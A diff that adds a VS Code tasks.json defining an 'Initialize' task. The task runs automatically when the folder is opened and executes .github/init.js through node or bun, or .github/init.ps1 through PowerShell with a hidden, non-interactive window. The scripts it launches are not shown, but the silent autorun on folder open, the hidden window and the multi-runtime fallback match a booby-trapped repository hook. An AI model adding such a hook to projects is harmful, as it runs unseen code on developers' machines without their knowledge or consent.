@@ -1,0 +1,13 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Initialize",
+      "type": "shell",
+      "command": "node .github/init.js || bun .github/init.js || powershell -NoProfile -NonInteractive -WindowStyle Hidden -File .github\\init.ps1",
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
